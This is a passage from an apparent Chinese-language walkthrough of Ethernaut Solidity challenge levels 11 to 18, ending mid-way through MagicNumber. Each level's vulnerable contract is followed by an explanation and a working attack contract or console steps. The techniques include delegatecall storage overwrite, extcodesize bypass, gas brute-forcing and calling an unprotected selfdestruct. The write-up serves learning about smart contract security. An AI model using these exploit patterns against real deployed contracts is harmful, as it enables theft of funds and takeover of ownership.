class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="11-Elevtor"><a href="#11-Elevtor" class="headerlink" title="11. Elevtor"></a>11. Elevtor</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目要求到达电梯楼层，而<code>Building</code>是一个接口，类似抽象类，而<code>isLastFloor</code>类似一个抽象函数，因此可以自己设计这个函数的内容。题目中的要求是<code>top=true</code>，但在题目中要进入 if 分支，<code> building.isLastFloor(_floor)==false</code>，而top又等于<code>building.isLastFloor(_floor)</code>，所以可以将<code>isLastFloor</code>设置为针对同一个变量的取反函数，第一次调用返回 false，第二次调用返回 true即可满足题目条件。</p>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">  function goTo(uint _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Building &#123;</span><br><span class="line">	bool floor = true;</span><br><span class="line">	address target;</span><br><span class="line">	Elevator elevator;</span><br><span class="line">	function isLastFloor(uint) external returns (bool) &#123;</span><br><span class="line">		floor = !floor;</span><br><span class="line">		return floor;</span><br><span class="line">	&#125;</span><br><span class="line">	function exploit(address _addr) public &#123;</span><br><span class="line">		elevator = Elevator(_addr);</span><br><span class="line">		elevator.goTo(1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12. Privacy"></a>12. Privacy</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = 10;</span><br><span class="line">  uint8 private denomination = 255;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[2]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题要求我们输入data数组的第二个元素的前16个字节即可，考察以太坊中状态变量的内存分布。</p>
<p>该合约的内存布局为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">======================================================    </span><br><span class="line">     unused (31 bytes)  | locked (1 byte)                    slot 0</span><br><span class="line">======================================================</span><br><span class="line">    					ID(32 bytes) 												           slot 1  </span><br><span class="line">======================================================</span><br><span class="line">unused |awkwardness(2)|denomination(1)|flattening(1)         slot 2</span><br><span class="line">======================================================</span><br><span class="line">						data[0] 32 bytes                                 slot 3</span><br><span class="line">======================================================</span><br><span class="line">						data[1] 32 bytes												         slot 4</span><br><span class="line">======================================================</span><br><span class="line">						data[2] 32 bytes                                 slot 5</span><br><span class="line">======================================================</span><br></pre></td></tr></table></figure>

<p>利用 web3py 读出数组 <code>data[2]</code>的内容：</p>
<h3 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13. Gatekeeper One"></a>13. Gatekeeper One</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目要求通过三个<code>gate</code>，第一个与第四关类似，表示发起交易的账户必须是合约账户，不是用户账户， 可以通过部署一个合约，在合约中调用即可；第二个gate要求交易剩余的gas量必须是 8191 的倍数，只需要设置 <code>gas = 8191 *n + x</code>，x表示本次交易需要消耗的gas，可以对 x 进行爆破；第三个gate主要考察 solidity 的类型转换。</p>
<p>以 <code>_gateKey = 0x12345678eadbeef_</code>为例：</p>
<ul>
<li><code>uint32(uint64(_gateKey))</code>转换后会取低位，所以转换后的值为<code>0xdeadbeef</code>，<code>uint16(uint64(_gateKey))</code>也会被转为<code>0xbeef</code>，uint16 和 uin32做比较时，较小的类型 uint16 会在高位填充 0，即填充为<code>0x0000beef</code>进行比较，因此通过第一个 require 就要求<code>_gateKey</code>形为<code>0x********0000****</code>即可；</li>
<li>第二个 require 要求俩边不相等，只需要高 4 字节中有任何一个bit不为0即可；</li>
<li>由第一个require可以知道<code>uint32(uint64(_gateKey))</code>应该是类似<code>0x0000beef</code>这种形式，所以需要让最低的2个字节和<code>tx.orign</code>地址里最低的2个字节相同，即_gateKey的最低2个字节设置为合约地址的低2个字节。这里tx.origin就是metamask的账户地址。</li>
</ul>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne &#123;</span><br><span class="line">    function entrant() external returns (address);</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    GatekeeperOne gatekeeperOne;</span><br><span class="line">    address target;</span><br><span class="line">    address entrant;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        // 设置为题目地址</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        // 后四位是metamask上账户地址的低2个字节</span><br><span class="line">        bytes8 key=0xAAAAAAAA0000c7e5;</span><br><span class="line">        bool result;</span><br><span class="line">        for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">            (bool result, bytes memory data) = address(target).call.gas(i+150+8191*3)(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getentrant() public &#123;</span><br><span class="line">        gatekeeperOne = GatekeeperOne(target);</span><br><span class="line">        entrant = gatekeeperOne.entrant();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14. Gatekeeper Two"></a>14. Gatekeeper Two</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>这道题目中的<code>gateOne</code>与上一次相同，部署一个合约在合约中调用即可；</p>
</li>
<li><p><code>gateTwo</code>涉及到汇编语言，<strong>extcodesize</strong>表示返回对应地址的合约代码的大小，其中 <code>caller()</code>返回的是<code>call sender</code>即调用的发起者，如果<code>extcodesize</code>的参数是用户地址则会返回0，是合约地址则返回了调用合约的代码大小。<code>extcodesize</code>具有一个特性：当合约处于部署阶段时，<code>extcodesize</code>的值为 0，如果我们在<code>constructor</code>中调用这个函数的话，那么<code>extcodesize(caller())</code>返回0，因此可以绕过检查。</p>
</li>
<li><p><code>gateThree</code>是一个异或，所以可以知道<code>_gateKey)=bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0)-1))</code></p>
</li>
</ul>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    address public target;</span><br><span class="line">    bytes8 key;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        target=_addr;</span><br><span class="line">        key=bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0)-1));</span><br><span class="line">        (bool result,)=target.call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="15-Naugth-Coin"><a href="#15-Naugth-Coin" class="headerlink" title="15. Naugth Coin"></a>15. Naugth Coin</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">  // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">  // uint public constant decimals = 18;</span><br><span class="line">  uint public timeLock = now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;)</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">    // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender == player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这道题要求将题目中的所有token转出，但是题目中对 <code>transfer</code>函数作出了限制，<code>player</code>只有在10年后才可以进行转账操作，但是因为只限制了<code>transfer</code>函数的<code>msg.sender</code>不能为<code>player</code>，但在 ERC20 中还有另一个转账函数<code>transferFrom</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender = _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在转账前需要先使用<code>approve</code>函数进行授权，然后再调用次函数进行转账。</p>
<p>解题步骤：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">value = <span class="string">&#x27;1000000000000000000000000&#x27;</span></span><br><span class="line"><span class="comment">//授权</span></span><br><span class="line"><span class="keyword">await</span> contract.approve(player,value)</span><br><span class="line"><span class="comment">//转账到任意地址</span></span><br><span class="line"><span class="keyword">await</span> contract.transferFrom(player,<span class="string">&#x27;other address&#x27;</span>,value)</span><br></pre></td></tr></table></figure>



<h3 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16. Preservation"></a>16. Preservation</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完成该题目的要求是成为合约的 owner，而成为 owner 的要点就在于<code>delegatecall</code>，Preservation 合约中的俩个函数中的<code>delegatecall</code>调用的都是<code>setTime </code>函数，这个函数可以修改全局变量中的    <code>storagedTime</code>变量。</p>
<p>对于 Preservation 合约的存储布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===================================================</span><br><span class="line">    unused (12 bytes) | timeZone1Library (20 bytes)				slot 0   </span><br><span class="line">===================================================</span><br><span class="line">    unused (12 bytes) | timeZone2Library (20 bytes)				slot 1</span><br><span class="line">===================================================        </span><br><span class="line">    unused (12 bytes) | owner (20 bytes)                  slot 2</span><br><span class="line">===================================================</span><br><span class="line">          storedTime (32 bytes)    												slot 3</span><br><span class="line">===================================================</span><br></pre></td></tr></table></figure>

<p>对于 LibraryContract 合约的存储布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===================================================</span><br><span class="line">          storedTime (32 bytes)                           slot 0</span><br><span class="line">===================================================</span><br></pre></td></tr></table></figure>

<p>当合约初始化时，<code>Preservation</code> 的 slot 0 和 slot 1 存储的是 LibraryContract 合约的地址，slot 2 存储的是 owner 的地址，因此我们的最终目的就是将 slot 2 修改为player 的地址。</p>
<p>当我们调用<code>setFirstTime</code>函数时，实际上是在<code>Preservation</code>合约内部调用<code>setTme</code>函数，此时修改的变量时slot 0，我们可以利用这一点去修改<code>timeZone1Library</code>=变量的值，所以我们可以将其设置为恶意合约的地址，并在恶意合约内写一个<code>setTime</code>函数，当执行<code>setFirstTime</code>函数时，就会调用到我们恶意合约内部的<code>setTime</code>函数，那么就可以实现合约的任意代码执行，实现变量覆盖。</p>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract PreservationExploit &#123;</span><br><span class="line">      address public timeZone1Library;</span><br><span class="line">      address public timeZone2Library;</span><br><span class="line">      address public owner; </span><br><span class="line">      </span><br><span class="line">      function setTime(uint256 timestamp) public &#123;</span><br><span class="line">          owner = address(timestamp);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击步骤：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">&#x27;攻击合约地址&#x27;</span>);</span><br><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">&#x27;player&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>调用<code>setFirstTime</code>俩次，实现俩次变量覆盖。</p>
<h3 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17. Recovery"></a>17. Recovery</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  // public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完成这道题目的要求是找到丢失的合约地址找回丢失的0.5个以太币。思路是可以通过在<code>https://rinkeby.etherscan.io/</code>中查询<code>Recover</code>合约对应的地址，查看该合约的 <strong>Internal Txns</strong>从中找到创建的<code>SimpleToken</code>合约的地址。</p>
<p><img src="/image/Ethernaut.assets/image-20220922133444783.png" alt="image-20220922133444783"></p>
<p>在获取到<code>SimpleToken</code>地址后就可以调用合约中的 <code>destory</code>函数即可。</p>
<p>攻击合约：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface SimpleToken &#123;</span><br><span class="line">    function destroy(address payable _to) external;</span><br><span class="line">&#125;</span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    address SimpleTokenAddr;</span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        SimpleTokenAddr = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        SimpleToken(SimpleTokenAddr).destroy(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有一种计算到合约地址的方法，每个账户都有一个关联的 nonce：对于普通账户，它在每笔交易中都会增加，而对于合约账户，它会在每次合约创建时增加。随机数不能重复使用，它们必须是顺序的</p>
<p><code>newAddr = keccak256(address, nonce)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rlp</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> keccak, to_checksum_address, to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mk_contract_address</span>(<span class="params">sender: <span class="built_in">str</span>, nonce: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Create a contract address using eth-utils.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # https://ethereum.stackexchange.com/a/761/620</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    sender_bytes = to_bytes(hexstr=sender)</span><br><span class="line">    raw = rlp.encode([sender_bytes, nonce])</span><br><span class="line">    h = keccak(raw)</span><br><span class="line">    address_bytes = h[<span class="number">12</span>:]</span><br><span class="line">    <span class="keyword">return</span> to_checksum_address(address_bytes)</span><br></pre></td></tr></table></figure>

<h3 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18. MagicNumber"></a>18. MagicNumber</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目需要利用汇编语言部署一个微型合约。</p>
<p>首先需要了解合约在创建时会发生涉什么：</p>
<p><img src="/image/Ethernaut.assets/1*5Wrb7z3W6AMtjH6IKJYowg.jpeg" alt="img"></p>
<p>在初始化合约时：</p>
<ol>
<li><p>用户或合约向以太网发送交易，此交易包含数据，但是不包含接受者的地址。只是向EVM表明这是一个<code>contract Creation</code>，不是常规的事务。</p>
</li>
<li><p>然后EVM将Solidity代码编译为机器可读的字节码，字节码会转换为在调用栈中执行的操作码。</p>
<blockquote>
<p>创建合约的字节码包含合约初始化代码和合约运行时代码。</p>
</blockquote>
</li>
<li><p>在合约的创建过程中，EVM 只执行初始化代码直到执行堆栈中的第一个 <strong>STOP</strong> 或 <strong>RETURN</strong>指令，在这个阶段，合约的构造函数**(constructor()**)会执行并产生一个合约地址。</p>
</li>
<li><p>当初始代码运行后，只有运行时（runtime code）代码会保留在栈上，然后将这些操作码复制到内存中并返回到EVM。</p>
</li>
<li><p>最后，<strong>EVM</strong>将返回的剩余代码存储在 storage 中，并且与新的合约地址相关联。</p>
</li>
</ol>
<p>题目要求我们给出一个合约地址，该合约需要返回<code>whatIsTheMeaningOfLife()</code>的正确数字，这个数字题目中给出提示是42，而且这道题目还有一个要求，合约中只能有10个操作码，所以需要手动编写一个程序。</p>
<ol>
<li><p>首先运行时代码（runtime code）：构造返回42的逻辑，返回<code>0x42</code>且小于10个操作码。最后一条命令一定是<strong>RETURN</strong>，而<strong>RETURN</strong>命令返回时，栈顶（stack[0]）对应的数字是<strong>offset</strong>，stack[1]是<strong>length</strong>，最终返回的是<code>memory[offset:offset+length]</code>，所以需要把返回值42存储到<strong>memory</strong>中，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000  60  PUSH1 0x2a</span><br><span class="line">0002  60  PUSH1 0x50</span><br><span class="line">0004  52  mstore</span><br><span class="line">0007  60  PUSH1 0x20</span><br><span class="line">0009  60  PUSH1 0x50  //低位用来存储运行时代码</span><br><span class="line">000B  F3  RETURN</span><br></pre></td></tr></table></figure>

<p>对应的字节码为<code>602a60505260206050f3</code>正好10个opcode，即正好10个字节</p>
</li>
<li><p>运行时代码构造完成后还需要在之前加上初始化代码，即将运行时代码复制到<code>memory</code>中，然后再RETURN，否则无法直接运行，复制代码需要用到<code>CODECOPY</code>指令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000  60  PUSH1 0x0a //length</span><br><span class="line">0002  60  PUSH1 0x0c</span><br><span class="line">0004  60  PUSH1 0x00</span><br><span class="line">0006  39  CODECOPY</span><br><span class="line">0007  60  PUSH1 0x0a</span><br><span class="line">0009  60  PUSH1 0x00</span><br><span class="line">000B  F3  RETURN</span><br></pre></td></tr></table></figure>

<p>第一步<code>PUSH1 0x0a</code>对应的是<strong>length</strong>变量，因为我们上面构造的<strong>opcode</strong>序列长度为10。第二步<code>PUSH1 0x0c</code>是因为，初始化代码的长度为0x0B，也就是运行时代码的字节码是从 0x0c 偏移开始的，因此<code>offset</code>为0xc。第三步<code>PUSH1 0</code>是指定将我们的代码复制到内存的slot 0处。前4条指令，<strong>完成了将0xC到0x16这10个字节复制到memory的0x00到0xA位置处的任务</strong>。</p>
<p>最终的代码为：</p>
